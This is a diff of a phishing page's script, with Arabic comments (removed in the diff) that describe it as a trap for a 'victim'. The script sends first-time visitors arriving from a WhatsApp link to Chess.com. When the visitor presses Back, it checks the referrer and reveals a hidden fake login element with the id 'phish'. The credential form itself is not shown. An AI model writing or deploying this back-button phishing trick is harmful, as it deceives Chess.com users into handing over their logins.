@@ -33,16 +33,12 @@
     </div>
 
     <script>
-        // بنشيك على الـ Referer اللي جاب الضحية للصفحة بتاعتنا
         if (document.referrer.includes("chess.com")) {
-            // لو الضحية راجع من Chess.com (داس Back)
-            // أظهر صفحة التصيد المزيفة (الفخ)
             document.getElementById("phish").style.display = "block";
         } else {
-            // لو الضحية لسه فاتح اللينك بتاعنا لأول مرة (من واتساب أو غيره)
-            // اعمل تحويل أوتوماتيكي فوراً من غير ما يدوس على حاجة
             window.location.href = "https://www.chess.com/no-ads";
         }
     </script>
 </body>
+
 </html>
